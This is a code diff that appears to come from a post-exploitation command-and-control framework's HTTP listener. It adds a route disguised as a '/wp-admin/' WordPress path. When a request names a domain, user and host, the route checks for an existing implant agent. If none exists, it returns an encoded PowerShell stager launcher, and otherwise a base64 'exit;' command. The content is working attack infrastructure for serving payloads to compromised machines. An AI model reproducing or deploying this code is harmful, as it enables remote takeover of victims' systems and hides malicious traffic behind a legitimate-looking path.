@@ -940,6 +940,21 @@ def send_message(packets=None):
             else:
                 return make_response(self.default_response(), 404)
 
+        @app.route('/wp-admin/<domain>/<username>/<hostname>', methods=['GET'])
+        def check_agent(domain,username,hostname):
+            """
+            Check if an active agent already exists for a particular user, on a particular host.
+            """
+            username = domain + "\\" + username
+            result = self.mainMenu.agents.get_agents_by_username_host(username, hostname)
+            if result:
+                # Powershell base64 encoded command: "exit;" 
+                return "ZQB4AGkAdAA7AAoA"
+            else:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName,language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = helpers.enc_powershell(launcher)
+                return launcher
+                
         @app.before_request
         def check_ip():
             """
